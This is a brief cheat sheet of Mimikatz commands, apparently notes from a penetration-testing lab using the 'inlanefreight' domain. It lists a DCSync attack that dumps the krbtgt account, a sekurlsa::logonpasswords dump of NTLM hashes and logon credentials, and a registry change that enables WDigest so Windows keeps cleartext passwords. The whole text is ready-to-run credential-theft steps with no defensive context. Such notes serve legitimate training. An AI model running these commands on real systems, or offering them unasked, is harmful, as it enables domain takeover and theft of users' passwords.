
debug
```powershell-session
privilege::debug
```

dcsync attack
```powershell-session
PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

Extract NTLM hashes for users on local host
```
privilege::debug 
sekurlsa::logonpasswords
```


If password hash not crackable enable wdigest in registry
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

